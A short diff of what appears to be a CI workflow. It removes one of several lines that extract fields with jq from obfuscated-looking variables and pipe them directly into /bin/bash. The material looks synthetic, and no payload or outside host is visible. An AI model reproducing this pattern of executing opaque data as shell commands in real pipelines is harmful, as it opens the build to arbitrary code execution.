@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$xz15" | jq -r .fua0614 | /bin/bash
           echo $osij728 | jq -r .hwhz697 | /bin/bash
           echo $bnl88 | jq -r .eosk1 | /bin/bash
-          echo $tqfk953 | jq -r .w25 | /bin/bash
           echo $iu94 | jq -r .y189 | /bin/bash
 
       - name: Save output
